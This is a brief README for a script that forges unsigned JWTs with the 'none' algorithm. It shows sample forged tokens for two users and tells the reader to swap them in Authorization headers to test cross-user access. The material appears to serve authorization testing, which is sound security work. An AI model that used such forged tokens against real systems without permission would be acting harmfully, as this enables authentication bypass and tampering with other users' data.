# Generate un-signed jwt token to test for "The None Algorithm"

## Usage
Replace the body payload with the body that you have decoded from your JWT token for the first user and the second user.

Run 

```bash
python main.py
```

Output should be something:

```bash
First user token:
eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.eyJjYWlkIjogIkNBSURFOTVEN0UxQTI5RTU0ODA5OTRFMEI1QkZEQkIzNzE0OCIsImV4cCI6IDE2MTk1NDU5MTh9.
Second user token:
eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.eyJjYWlkIjogIkNBSUQxMEMyQ0ZFRTcxMDQ0NTk5ODFCM0E2QzM1MzUxNkZBRiIsImV4cCI6IDE2MTk1NDU5MTh9.
```

Use these tokens in the `Authorization` header to try to modify the resources of user A with token B and vice versa.